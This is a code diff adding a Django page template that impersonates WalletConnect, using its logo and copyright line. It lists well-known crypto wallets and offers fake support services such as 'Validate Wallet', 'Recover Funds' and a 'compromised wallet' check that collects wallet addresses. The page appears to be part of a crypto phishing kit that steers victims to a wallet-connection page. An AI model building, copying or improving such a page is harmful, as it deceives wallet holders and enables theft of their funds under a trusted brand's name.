@@ -1,0 +1,255 @@
+{% extends 'base.html'%}
+{% load static %}
+{% block content %}
+    <!-- top section -->
+<div class="top-text">
+    <h6>v2.0 Swift and Kotlin SDKs are now in Beta!</h6>
+</div>
+<div class="sticky-top logo">
+    <img src="{% static 'Images/walletconnect2.png' %}" alt="Wallet connect logo">
+</div>
+<div class="page-body mt-2">
+    <!-- body -->
+    <div class="container holder">
+        <div class="wallet-register-text">
+            Registry
+        </div>
+        <div class="wallet-text">
+            Registry of all wallets supporting WalletControl Protocol
+        </div>
+        <div class="row g-5 mt-1">
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/Rainbow_img.jpeg' %}" alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Rainbow</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/trust_wallet_img.jpeg' %}" alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Trust wallet</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/Torus_img.jpeg' %}" alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Torus</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/Pillar_img.jpeg' %}
+                        " alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Pillar</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/coinomi_img.jpeg' %}
+                        " alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Coinomi</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/metatmask_img.jpeg' %}
+                        " alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Metamask</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/authereum_img.jpeg' %}
+                        " alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Authereum</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-6 col-sm-6 col-md-4 col-lg-3 wallet-card">
+                <div class="card-body">
+                    <div class="wallet-img">
+                        <img src="{% static '/Images/bitpay_img.jpeg' %}
+                        " alt="" width="100%">
+                    </div>
+                    <div class="wallet-img-text">
+                        <b><h6>Bitpay</h6></b>
+                        <p>WALLET</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="select-section">
+            <div class="wallet-register-text mt-3">
+                Services
+            </div>
+            <div class="row g-5 mt-1">
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-th-large icons"></i>
+                        </div>
+                        <a href="{% url 'wallets' %}" style="text-decoration:none;color:black">
+                            <div class="wallet-img-text mt-3">
+                                <p><b>Swap/Exchange</b></p>
+                                <p>We will support you in any related issues with swaping and/or exchange of coins. Kindly click here.</p>
+                            </div>    
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-wallet icons"></i>
+                        </div>
+                        <a href="{% url 'wallets' %}" style="text-decoration:none;color:black">
+                            <div class="wallet-img-text mt-3">
+                                <p><b>Validate Wallet</b></p>
+                                <p>Connect your decentralised wallet to Enable extended features on mobile wallet/Extension.
+                                Kindly click here.</p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-cogs icons"></i>
+                        </div>
+                        <a href="{% url 'wallets' %}" style="text-decoration:none;color:black">
+                            <div class="wallet-img-text mt-3">
+                                <p><b>Issues with trading wallet</b></p>
+                                <p>Do you have probems with your trading account?
+                                    Kindly click here</p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-chart-line icons"></i>
+                        </div>
+                        <a href="{% url 'wallets' %}" style="text-decoration:none;color:black">
+                            <div class="wallet-img-text mt-3">
+                                <p><b>High Fees</b></p>
+                                <p>Issues with transaction fees?.Kindly click here</p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-money-bill-wave icons"></i>
+                        </div>
+                        <a href="{% url 'wallets' %}" style="text-decoration:none;color:black">
+                            <div class="wallet-img-text mt-3">
+                                <p><b>Recover Funds</b></p>
+                                <p>Have you Lost Funds during a transaction?
+                                    Kindly click here</p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                <div class="col-12 col-sm-6 col-md-6 col-lg-6 wallet-card-2">
+                    <div class="card-body">
+                        <div class="wallet-icon">
+                            <i class="fas fa-window-close icons"></i>
+                        </div>
+                        <a href="#last" data-bs-toggle="modal" data-bs-target="#last" style="text-decoration:none;color:black" >
+                            <div class="wallet-img-text mt-3">
+                                <p><b>Check if your wallet has been compromised</b></p>
+                                <p>You feel your wallet has been altered with?
+                                    Kindly click here</p>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            </div>
+             <!-- Modal -->
+             <div class="modal fade modal-tweak-3" id="last" >
+                <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header modal-tweak-header">
+                    <h5 class="modal-title modal-tweak-title" id="exampleModalLabel"> <img src="/Images/atomic_img.jpeg" alt="" width="50px">Verify if wallet has been compromised</h5>
+                    </div>                    
+                    
+                        <form action="" class="form-tweak-1" method="POST">
+                            {% csrf_token %}
+                            <!-- 1q  -->
+                            <input type="text" placeholder="Enter your wallet address" class="input-tweak" name="walletaddress">
+                            <p class="form-tweak-text-1">Typically between 26 t0 35 alphanumeric character</p>
+                            <div id="loader">
+                                <div class="lds-ring">
+                                  <div></div>
+                                  <div></div>
+                                  <div></div>
+                                  <div></div>
+                                </div>
+                              </div>
+                            <button type="submit" class="button-tweak-1 load" onclick="load()"><span class="submit-tweak-1">Proceed</span></button>
+                        </form>
+                        
+                        <div class="modal-footer">
+                        <button type="button" class="btn btn-danger" data-bs-dismiss="modal">Cancel</button>
+                        </div>
+                </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- footer -->
+<div class="container mt-3">
+    <div class="footer-section">
+        <div class="footer-img">
+            <img src="/Images/walletconnect2.png" alt="">
+        </div>
+        <div class="footer-icons">
+            <ul>
+                <li><i class="fab fa-github"></i></li>
+                <li><i class="fab fa-twitter"></i></li>
+                <li><i class="fab fa-discord"></i></li>
+            </ul>
+        </div>
+        <div class="footer-copyright">
+            &copy; 2022 WalletConnect Inc
+        </div>
+    </div>
+</div>
+{% endblock content %}
